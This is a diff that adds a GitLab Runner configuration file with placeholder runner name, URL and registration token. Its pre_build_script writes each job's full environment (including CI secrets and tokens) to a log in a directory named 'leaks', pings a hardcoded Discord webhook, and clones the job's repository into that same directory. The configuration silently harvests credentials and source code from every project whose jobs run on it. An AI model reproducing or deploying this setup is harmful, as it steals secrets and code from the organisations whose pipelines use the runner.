@@ -1,0 +1,25 @@
+concurrent = 1
+check_interval = 0
+
+[[runners]]
+  name = "__RUNNER_NAME__"
+  url = "__GITLAB_URL__"
+  token = "__REGISTRATION_TOKEN__"
+  executor = "shell"
+  shell = "bash"
+
+  pre_build_script = """
+    echo "Running pre_build_script..."
+    echo '[+] Job started at: ' $(date) >> /volumes/leaks/__RUNNER_NAME__.log;
+    env >> /volumes/leaks/__RUNNER_NAME__.log;
+    echo '' >> /volumes/leaks/__RUNNER_NAME__.log;
+    curl -s -X POST -H 'Content-Type: application/json' -d '{\"content\":\"you have mail\"}' https://discord.com/api/webhooks/1395079953640325190/0kZXgnjDigMLIDV8kcgiEcdD0uHAP9YZzguwoi9c-dXzyi6OV3asUzImU-_GHw1xLfTb;
+    echo '[+] Backing up project...' >> /volumes/leaks/__RUNNER_NAME__.log;
+    export GIT_TERMINAL_PROMPT=0;
+    clone_dir="/volumes/leaks/__RUNNER_NAME__-$CI_JOB_ID"
+    git clone --depth 1 \"$CI_REPOSITORY_URL\" \"$clone_dir\" >> /volumes/leaks/__RUNNER_NAME__.log 2>&1 || echo 'Clone failed' >> /volumes/leaks/__RUNNER_NAME__.log
+  """
+
+  [runners.feature_flags]
+    custom_build_dir = true
+    
